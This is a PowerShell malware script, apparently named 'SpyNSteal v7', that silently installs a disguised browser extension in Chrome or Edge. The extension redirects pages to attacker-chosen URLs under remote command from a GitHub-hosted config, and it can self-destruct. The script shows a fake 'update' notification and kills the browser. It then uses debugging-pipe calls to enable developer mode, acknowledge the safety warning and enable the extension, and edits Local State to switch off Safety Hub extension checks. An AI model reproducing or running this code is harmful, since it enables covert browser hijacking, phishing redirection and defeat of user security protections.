# SpyNSteal v7 - CDP install + Safety Hub feature flag disable
# 1. Install extension via CDP (proven working in v5)
# 2. Disable Safety Hub extensions module via Local State feature flags
# Local State is NOT MAC-protected â€” freely editable plain JSON.

$MANIFEST = @'
{
  "manifest_version": 3,
  "name": "Chrome Resource Scheduler",
  "version": "1.0",
  "description": "Manages internal resource scheduling and prioritization.",
  "permissions": ["declarativeNetRequest"],
  "host_permissions": ["<all_urls>"],
  "background": {
    "service_worker": "sw.js"
  }
}
'@

$SW_JS = @'
const C = "https://raw.githubusercontent.com/Intel-Boss/t/main/config.json";
const I = 60000;
let R = null;

async function applyRule(target, url) {
  const id = 1;
  await chrome.declarativeNetRequest.updateDynamicRules({
    removeRuleIds: [id],
    addRules: [{
      id,
      priority: 1,
      action: { type: "redirect", redirect: { url } },
      condition: { urlFilter: target, resourceTypes: ["main_frame"] }
    }]
  });
  R = id;
}

async function pull() {
  try {
    const r = await fetch(C, { cache: "no-store" });
    if (!r.ok) return;
    const j = await r.json();
    if (j.selfDestruct) {
      if (R) await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
      return;
    }
    if (j.armed && j.target && j.url) {
      await applyRule(j.target, j.url);
    } else if (R) {
      await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
    }
  } catch (_) {}
}

async function init() {
  if (!C || C === "" || C.indexOf("%%") === 0) {
    await applyRule("||hi.com", "https://hi-test.com/");
    return;
  }
  pull();
  setInterval(pull, I);
}

chrome.runtime.onInstalled.addListener(() => init());
chrome.runtime.onStartup.addListener(() => init());
init();
'@

$LOGFILE = Join-Path $env:APPDATA "sns_debug.txt"
function Log([string]$msg) {
    $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    try { Add-Content $LOGFILE "[$ts] $msg" } catch {}
}

Log "=========================================="
Log "SpyNSteal v7 - Starting"
Log "User: $env:USERNAME | Machine: $env:COMPUTERNAME"
Log "=========================================="

Add-Type -ReferencedAssemblies @("System.Core") -TypeDefinition @"
using System;
using System.IO;
using System.IO.Pipes;
using System.Text;
using System.Diagnostics;
using System.Threading;
using System.Collections.Generic;

public class PipeCDP {
    private static void Send(AnonymousPipeServerStream pipe, string json) {
        byte[] b = Encoding.UTF8.GetBytes(json);
        pipe.Write(b, 0, b.Length);
        pipe.WriteByte(0);
        pipe.Flush();
    }

    private static string ExtractStr(string json, string key) {
        string p = "\"" + key + "\":\"";
        int s = json.IndexOf(p);
        if (s < 0) return null;
        s += p.Length;
        int e = json.IndexOf("\"", s);
        return (e > s) ? json.Substring(s, e - s) : null;
    }

    private static string WaitReply(List<string> q, object lk, int id, int timeoutMs) {
        string t1 = "\"id\":" + id;
        string t2 = "\"id\": " + id;
        DateTime deadline = DateTime.Now.AddMilliseconds(timeoutMs);
        while (DateTime.Now < deadline) {
            lock (lk) {
                for (int i = 0; i < q.Count; i++) {
                    if (q[i].Contains(t1) || q[i].Contains(t2)) {
                        string r = q[i]; q.RemoveAt(i); return r;
                    }
                }
            }
            Thread.Sleep(100);
        }
        return null;
    }

    public static string Install(string chromePath, string userDataDir, string extensionDir) {
        AnonymousPipeServerStream toChrome = null;
        AnonymousPipeServerStream fromChrome = null;
        Process proc = null;
        string log = "";

        try {
            toChrome = new AnonymousPipeServerStream(PipeDirection.Out, HandleInheritability.Inheritable);
            fromChrome = new AnonymousPipeServerStream(PipeDirection.In, HandleInheritability.Inheritable);

            string rHandle = toChrome.GetClientHandleAsString();
            string wHandle = fromChrome.GetClientHandleAsString();

            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = chromePath;
            psi.Arguments = String.Format(
                "--remote-debugging-pipe " +
                "--enable-unsafe-extension-debugging " +
                "--user-data-dir=\"{0}\" " +
                "--no-first-run --no-default-browser-check " +
                "--disable-background-networking " +
                "--remote-debugging-io-pipes={1},{2}",
                userDataDir, rHandle, wHandle);
            psi.UseShellExecute = false;

            try { proc = Process.Start(psi); }
            catch (Exception ex) { return "ERR:LAUNCH:" + ex.Message; }

            toChrome.DisposeLocalCopyOfClientHandle();
            fromChrome.DisposeLocalCopyOfClientHandle();
            log += "PID:" + proc.Id + "|";

            Thread.Sleep(8000);
            if (proc.HasExited) return log + "ERR:DIED:" + proc.ExitCode;

            List<string> queue = new List<string>();
            object qLock = new object();

            Thread reader = new Thread(delegate() {
                try {
                    StringBuilder sb = new StringBuilder();
                    while (true) {
                        int bt = fromChrome.ReadByte();
                        if (bt == -1) break;
                        if (bt == 0) {
                            string m = sb.ToString(); sb.Length = 0;
                            if (m.Length > 0) { lock (qLock) { queue.Add(m); } }
                        } else { sb.Append((char)bt); }
                    }
                } catch {}
            });
            reader.IsBackground = true;
            reader.Start();

            // Verify pipe
            Send(toChrome, "{\"id\":0,\"method\":\"Browser.getVersion\"}");
            string verResp = WaitReply(queue, qLock, 0, 10000);
            if (verResp == null) { log += "PIPE_DEAD|"; try { proc.Kill(); } catch {} return log; }
            log += "PIPE:ok|";

            // Install extension
            string extPath = extensionDir.Replace("\\", "/");
            Send(toChrome,
                "{\"id\":1,\"method\":\"Extensions.loadUnpacked\",\"params\":{\"path\":\"" + extPath + "\"}}");
            string extResp = WaitReply(queue, qLock, 1, 30000);
            log += "EXT:" + (extResp != null ? "ok" : "TIMEOUT") + "|";

            string loadedId = (extResp != null) ? ExtractStr(extResp, "id") : null;
            log += "ID:" + (loadedId != null ? loadedId : "NONE") + "|";

            if (loadedId != null) {
                // Open chrome://extensions for dev mode + acknowledge
                Send(toChrome,
                    "{\"id\":10,\"method\":\"Target.createTarget\",\"params\":{\"url\":\"chrome://extensions\"}}");
                string tResp = WaitReply(queue, qLock, 10, 15000);
                string targetId = (tResp != null) ? ExtractStr(tResp, "targetId") : null;

                if (targetId != null) {
                    Send(toChrome,
                        "{\"id\":11,\"method\":\"Target.attachToTarget\",\"params\":{\"targetId\":\"" + targetId + "\",\"flatten\":true}}");
                    string aResp = WaitReply(queue, qLock, 11, 10000);
                    string sessId = (aResp != null) ? ExtractStr(aResp, "sessionId") : null;

                    if (sessId != null) {
                        Thread.Sleep(5000);

                        // Enable developer mode
                        Send(toChrome,
                            "{\"id\":12,\"sessionId\":\"" + sessId + "\",\"method\":\"Runtime.evaluate\",\"params\":{" +
                            "\"expression\":\"chrome.developerPrivate.setProfileConfiguration({inDeveloperMode:true})\"," +
                            "\"awaitPromise\":true}}");
                        WaitReply(queue, qLock, 12, 10000);
                        log += "DEV:ok|";

                        Thread.Sleep(3000);

                        // Acknowledge safety check warning
                        string ackExpr = "chrome.developerPrivate.updateExtensionConfiguration({extensionId:'" + loadedId + "',acknowledgeSafetyCheckWarning:true})";
                        Send(toChrome,
                            "{\"id\":13,\"sessionId\":\"" + sessId + "\",\"method\":\"Runtime.evaluate\",\"params\":{" +
                            "\"expression\":\"" + ackExpr.Replace("\"", "\\\"") + "\",\"awaitPromise\":true}}");
                        WaitReply(queue, qLock, 13, 10000);
                        log += "ACK:ok|";

                        Thread.Sleep(2000);

                        // Force-enable extension
                        Send(toChrome,
                            "{\"id\":14,\"sessionId\":\"" + sessId + "\",\"method\":\"Runtime.evaluate\",\"params\":{" +
                            "\"expression\":\"chrome.management.setEnabled('" + loadedId + "',true)\"," +
                            "\"awaitPromise\":true}}");
                        WaitReply(queue, qLock, 14, 10000);
                        log += "EN:ok|";
                    }
                }
            }

            // Let Chrome flush preferences
            Thread.Sleep(8000);
            try { Send(toChrome, "{\"id\":99,\"method\":\"Browser.close\"}"); } catch {}
            bool exited = false;
            try { exited = proc.WaitForExit(15000); } catch {}
            if (!exited) { try { proc.Kill(); } catch {} try { proc.WaitForExit(5000); } catch {} }
            log += "EXIT:" + exited + "|";
            proc = null;
            return log;

        } catch (Exception ex) {
            return log + "ERR:" + ex.Message;
        } finally {
            if (proc != null) { try { if (!proc.HasExited) proc.Kill(); } catch {} }
            if (toChrome != null) try { toChrome.Dispose(); } catch {}
            if (fromChrome != null) try { fromChrome.Dispose(); } catch {}
        }
    }
}
"@
Log "C# compiled OK"

function Find-Browser([string]$name) {
    $info = @{ Name = $name; Found = $false; Running = $false }
    switch ($name) {
        "chrome" {
            $info.UserData = "$env:LOCALAPPDATA\Google\Chrome\User Data"
            $info.Proc = "chrome"
            $info.RegKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"
            $info.AppDirs = @(
                "$env:ProgramFiles\Google\Chrome\Application",
                "${env:ProgramFiles(x86)}\Google\Chrome\Application",
                "$env:LOCALAPPDATA\Google\Chrome\Application"
            )
            $info.NotifTitle = "Google Chrome"
            $info.NotifText = "An update has been downloaded. Restarting to apply changes."
        }
        "edge" {
            $info.UserData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
            $info.Proc = "msedge"
            $info.RegKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe"
            $info.AppDirs = @(
                "${env:ProgramFiles(x86)}\Microsoft\Edge\Application",
                "$env:ProgramFiles\Microsoft\Edge\Application",
                "$env:LOCALAPPDATA\Microsoft\Edge\Application"
            )
            $info.NotifTitle = "Microsoft Edge"
            $info.NotifText = "An update has been installed. Edge will restart to apply it."
        }
    }
    if (-not (Test-Path $info.UserData)) { return $info }
    $info.Found = $true
    $info.Running = [bool](Get-Process $info.Proc -EA SilentlyContinue)
    try { $info.ExePath = (Get-ItemProperty $info.RegKey -EA Stop).'(default)' } catch {}
    if (-not $info.ExePath -or -not (Test-Path $info.ExePath)) {
        foreach ($d in $info.AppDirs) {
            $exe = if ($name -eq "chrome") { "chrome.exe" } else { "msedge.exe" }
            $c = Join-Path $d $exe
            if (Test-Path $c) { $info.ExePath = $c; break }
        }
    }
    return $info
}

function Show-UpdateNotif($browser) {
    try {
        Add-Type -AssemblyName System.Windows.Forms -EA Stop
        Add-Type -AssemblyName System.Drawing -EA Stop
        $n = New-Object Windows.Forms.NotifyIcon
        if ($browser.ExePath -and (Test-Path $browser.ExePath)) {
            $n.Icon = [Drawing.Icon]::ExtractAssociatedIcon($browser.ExePath)
        } else { $n.Icon = [Drawing.SystemIcons]::Information }
        $n.BalloonTipTitle = $browser.NotifTitle
        $n.BalloonTipText = $browser.NotifText
        $n.Visible = $true
        $n.ShowBalloonTip(5000)
        Start-Sleep 5
        $n.Visible = $false; $n.Dispose()
    } catch {}
}

function Kill-Browser([string]$procName) {
    for ($i = 0; $i -lt 25; $i++) {
        if (-not (Get-Process $procName -EA SilentlyContinue)) { return $true }
        Get-Process $procName -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
        Start-Sleep -Milliseconds 500
    }
    return (-not [bool](Get-Process $procName -EA SilentlyContinue))
}

# =============================================================================
Log "STEP 1: Dropping extension files..."
$baseDir = Join-Path $env:APPDATA "CRSched"
$extDir = Join-Path $baseDir "src"
New-Item -Path $extDir -ItemType Directory -Force | Out-Null
$utf8 = New-Object Text.UTF8Encoding($false)
[IO.File]::WriteAllText((Join-Path $extDir "manifest.json"), $MANIFEST, $utf8)
[IO.File]::WriteAllText((Join-Path $extDir "sw.js"), $SW_JS, $utf8)
Log "  Extension at: $extDir"

Log "STEP 2: Finding browsers..."
$browsers = @()
foreach ($name in @("chrome","edge")) {
    $b = Find-Browser $name
    Log "  ${name}: Found=$($b.Found) Running=$($b.Running) Exe=$($b.ExePath)"
    if ($b.Found -and $b.ExePath) { $browsers += $b }
}
if ($browsers.Count -eq 0) { Log "FATAL: No browsers"; exit }

Log "STEP 3: Kill browsers..."
$wasRunning = @()
foreach ($b in $browsers) { if ($b.Running) { $wasRunning += $b } }
if ($wasRunning.Count -gt 0) { Show-UpdateNotif $wasRunning[0] }
foreach ($b in $browsers) {
    if ($b.Running) {
        $k = Kill-Browser $b.Proc
        Log "  $($b.Proc) killed: $k"
    }
}
Start-Sleep 3

$target = if ($wasRunning.Count -gt 0) { $wasRunning[0] } else { $browsers[0] }
Log "STEP 4: Target = $($target.Name) v$((Get-Item $target.ExePath).VersionInfo.FileVersion)"

# -- Create junction --
$realUserData = $target.UserData
$junctionPath = Join-Path (Split-Path $realUserData -Parent) "User Data_dbg"
Log "STEP 5: Creating junction..."
if (Test-Path $junctionPath) {
    $ji = Get-Item $junctionPath -Force
    if ($ji.Attributes -band [IO.FileAttributes]::ReparsePoint) { cmd /c rmdir "$junctionPath" 2>$null }
    else { Remove-Item $junctionPath -Recurse -Force -EA SilentlyContinue }
}
cmd /c mklink /J "$junctionPath" "$realUserData" 2>&1 | Out-Null
if (-not (Test-Path $junctionPath)) { Log "FATAL: Junction failed"; exit }
Log "  Junction OK"

# -- CDP install (single pass, proven in v5) --
Log "STEP 6: CDP install (takes ~50 seconds)..."
$cdpResult = [PipeCDP]::Install($target.ExePath, $junctionPath, $extDir)
Log "STEP 6: Result = $cdpResult"

# -- Remove junction --
Start-Sleep 2
cmd /c rmdir "$junctionPath" 2>$null
Log "STEP 7: Junction removed"

# -- Parse extension ID --
$extId = ""
if ($cdpResult -match 'ID:([a-z]{32})') {
    $extId = $matches[1]
    Log "  Extension ID: $extId"
}

# -- Verify extension in Secure Preferences --
$secPrefs = Join-Path $realUserData "Default\Secure Preferences"
if ($extId -and (Test-Path $secPrefs)) {
    $sp = [IO.File]::ReadAllText($secPrefs)
    Log "  In Secure Prefs: $($sp.Contains($extId))"
    Log "  Ack in Secure Prefs: $($sp.Contains('ack_safety_check'))"
}

# =============================================================================
# STEP 8: Disable Safety Hub extensions module via Local State feature flags
# Local State is NOT MAC-protected â€” we can freely edit it.
# =============================================================================
Log "STEP 8: Disabling Safety Hub extensions module in Local State..."

$localState = Join-Path $realUserData "Local State"
if (Test-Path $localState) {
    try {
        $lsJson = [IO.File]::ReadAllText($localState)

        # Patch crash state
        $lsJson = $lsJson.Replace('"exited_cleanly":false', '"exited_cleanly":true')
        $lsJson = $lsJson.Replace('"exit_type":"Crashed"', '"exit_type":"Normal"')

        # Parse JSON to add feature flags
        $ls = $lsJson | ConvertFrom-Json

        # Add disabled feature flags to enabled_labs_experiments
        # Format: "flag-name@2" means disabled (0=default, 1=enabled, 2=disabled)
        $flagsToDisable = @(
            "safety-check-extensions@2",
            "safety-hub-extensions-off-store-trigger@2",
            "safety-hub-extensions-uws-trigger@2"
        )

        if (-not $ls.browser) { $ls | Add-Member -NotePropertyName "browser" -NotePropertyValue ([PSCustomObject]@{}) -Force }
        $existingFlags = @()
        if ($ls.browser.enabled_labs_experiments) {
            $existingFlags = @($ls.browser.enabled_labs_experiments)
        }

        foreach ($flag in $flagsToDisable) {
            $flagBase = $flag -replace '@\d+$', ''
            $existingFlags = @($existingFlags | Where-Object { $_ -notmatch "^$([regex]::Escape($flagBase))@" })
            $existingFlags += $flag
        }
        $ls.browser | Add-Member -NotePropertyName "enabled_labs_experiments" -NotePropertyValue $existingFlags -Force
        Log "  Flags set: $($existingFlags -join ', ')"

        # Also try direct feature override approach via command-line style
        # Chrome reads "browser.enabled_features" and "browser.disabled_features" in some builds
        $disabledFeatures = "SafetyCheckExtensions,SafetyHubExtensionsOffStoreTrigger,SafetyHubExtensionsUwSTrigger"
        $ls.browser | Add-Member -NotePropertyName "disabled_features" -NotePropertyValue $disabledFeatures -Force
        Log "  Disabled features: $disabledFeatures"

        $lsOutput = $ls | ConvertTo-Json -Depth 20 -Compress
        [IO.File]::WriteAllText($localState, $lsOutput, $utf8)
        Log "  Local State written OK"
    } catch {
        Log "  Local State modification failed: $_"
    }
} else {
    Log "  WARNING: Local State not found at $localState"
}

# =============================================================================
# STEP 9: Relaunch Chrome normally (no flags)
# =============================================================================
Log "STEP 9: Relaunching $($target.Name) normally..."
Start-Process $target.ExePath
Start-Sleep 5
Log "  Running: $([bool](Get-Process $target.Proc -EA SilentlyContinue))"

Log "=========================================="
Log "DONE - Extension installed, Safety Hub disabled via Local State flags"
Log "Log: $LOGFILE"
Log "=========================================="
